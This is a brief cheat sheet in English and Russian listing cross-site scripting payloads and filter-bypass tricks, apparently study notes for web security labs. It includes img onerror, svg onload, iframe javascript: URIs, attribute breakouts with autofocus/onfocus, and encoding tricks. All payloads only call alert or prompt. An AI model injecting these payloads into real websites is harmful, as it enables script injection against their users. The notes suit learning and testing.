tips for xxs
without parantheses


```js
<img src=1 onerror=alert(1)>
#<img src=1 onerror=alert(1)>
<script>document.querySelector(‘#thm-title’).textContent = I am a hacker'</script>

onfucus="alert(9)" autofocus x="

eval('alert(9)')

“e”.charCodeAt(0).toString(16)

в href javascript:alert

<iframe src="javascript:alert(`xss`)"> 


/#/score-board/

"><svg onload=alert(1)>
<svg/onload=alert()>
<img src onerror=alert(0)>
```
────────────────────────────────────────────
Основные методы вызова js из html
```js
<script>...</script>
<img onerror="..." src="x">
<a href="%20javascript:..."></a>
<iframe src="javascript:...">
<iframe onload='alert``'>
autofocus onfocus="alert()" #%20 %09
javascript://qwe.com/%0aalert()
encode html entety
```

пробелы могу заменяться “/”, тэг необязательно закрывать
double URL encoding

```js
prompt('xss')
%00<script>alert(9)</script>
alert(location.origin)
${alert}
```